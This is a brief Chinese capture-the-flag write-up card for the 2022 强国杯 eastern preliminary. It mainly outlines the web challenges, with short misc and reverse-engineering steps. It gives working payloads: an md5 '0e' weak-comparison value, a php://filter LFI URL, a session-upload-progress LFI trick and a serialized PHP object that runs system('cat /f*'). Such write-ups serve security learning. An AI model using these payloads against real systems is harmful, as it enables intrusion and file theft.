---
title: "2022 强国杯东部初赛 CTF WriteUp"
category: web
tags: ["2022 强国杯东部初赛", "web", "强国杯", "md5-0e", "php://filter", "LFI"]
signals: ["2022 强国杯东部初赛 2022", "强国杯", "md5-0e", "php://filter", "LFI", "eval", "反序列化逃逸", "session-upload-progress", "LFI-to-RCE", "sqli", "lfi", "rce", "deserialize", "md5"]
difficulty: medium
source: "https://www.ctfiot.com/63358.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2022 强国杯东部初赛 CTF WriteUp

> 赛事：2022 强国杯东部初赛 2022 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

强国杯东部 2022：md5 弱类型 + LFI + 反序列化逃逸 + session-upload LFI

## 攻击链

1. md5_php: md5 弱类型比较 ''0e215962017'' 是 0e 开头, ?md5=0e215962017
2. LFI: ?le.php?file=php://filter/convert.base64-encode/index/resource=flag
3. 反序列化: main.__construct 调 evil; evil.action eval($this->file) = system(''cat /f*'')
4. phpti: session.upload.progress 触发 LFI, file 字段是 |O:5:admin 反序列化 payload
5. Misc 平正开: 字节取反 (256-x) 还原 zip → hiencode CV 解码
6. Re re2: pyinstxtractor 解包 exe + pyc 反编译 → 改 score=0 直接给 flag

## 关键 payload

```
O:4:"main":1:{s:11:"\0*\0ClassObj";O:4:"evil":1:{s:10:"\0evil\0file";s:18:"system("cat /f*");";}
```

## 经验教训

PHP `__construct` 自动调用是反序列化入门；session.upload.progress LFI 是经典；0e md5 弱类型

## 标签

强国杯、md5-0e、php://filter、LFI、eval、反序列化逃逸、session-upload-progress、LFI-to-RCE、pyinstxtractor、字节取反、hiencode

## 参考来源

- https://www.ctfiot.com/63358.html
- 原文件：2022强国杯东部_初赛CTF-WriteUp.full.md
